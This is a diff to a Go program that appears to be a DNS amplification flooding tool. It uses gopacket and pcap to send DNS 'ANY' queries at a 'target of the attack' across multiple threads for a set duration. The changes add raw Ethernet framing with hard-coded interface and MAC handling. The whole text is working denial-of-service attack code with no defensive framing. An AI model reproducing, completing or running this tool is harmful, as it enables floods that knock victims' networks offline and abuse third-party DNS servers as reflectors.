@@ -2,6 +2,7 @@ package main
 
 import (
 	"flag"
+	"fmt"
 	"net"
 	"time"
 
@@ -11,15 +12,19 @@ import (
 )
 
 // CLI arguments
-var target_ip = flag.String("target ip", "", "The IP address of the target of the attack")
+var target_mac = flag.String("target_mac", "", "The MAC address of the first hop, probably gateway")
+var target_ip = flag.String("target_ip", "", "The IP address of the target of the attack")
 var filename = flag.String("filename", "domains.csv", "A csv file with domain names")
-var num_threads = flag.Int("num threads", 1, "The number of threads to run in parallel")
+var num_threads = flag.Int("num_threads", 1, "The number of threads to run in parallel")
 var duration = flag.Int("duration", 1, "The duration of the attack in seconds")
 
+var src_mac net.HardwareAddr
+var dst_mac net.HardwareAddr
 var target net.IP
 var options gopacket.SerializeOptions
 
 const SRC_PORT = 42000
+const IFACE = "enp0s31f6"
 
 func init() {
     options = gopacket.SerializeOptions{
@@ -30,7 +35,22 @@ func init() {
 
 func main() {
     flag.Parse()
+    ifaces, err := net.Interfaces()
+    if err != nil {
+        panic(err)
+    }
+    for _, iface := range ifaces {
+        if iface.Name == IFACE {
+            fmt.Println(iface.HardwareAddr)
+            src_mac = iface.HardwareAddr
+        }
+    }
     target = net.ParseIP(*target_ip)
+    dst_mac, err = net.ParseMAC(*target_mac)
+    if err != nil {
+        panic(err)
+    }
+
     // readFile()
 
     // Start threads
@@ -50,7 +70,7 @@ func readFile() {
 // Goroutine to send packets, each thread has own number and it uses that number as modulo for which line to read
 // Proceed in round-robin fashion (cycling through domains / name servers)
 func send() {
-    handle, err := pcap.OpenLive("enp0s31f6", 1500, false, pcap.BlockForever)
+    handle, err := pcap.OpenLive(IFACE, 1500, false, pcap.BlockForever)
     if err != nil {
         panic(err)
     }
@@ -65,6 +85,11 @@ func send() {
 
 // create ANY request packet
 func makePacket(domainName string, destinationIP net.IP) []byte {
+    ethernet := layers.Ethernet{
+        SrcMAC: src_mac,
+        DstMAC: dst_mac,
+        EthernetType: layers.EthernetTypeIPv4,
+    }
     ip := layers.IPv4{
         Version: 4,
         TTL: 64,
@@ -87,6 +112,7 @@ func makePacket(domainName string, destinationIP net.IP) []byte {
     }
     buffer := gopacket.NewSerializeBuffer()
     if err := gopacket.SerializeLayers(buffer, options,
+        &ethernet,
         &ip,
         &udp,
         &dns,
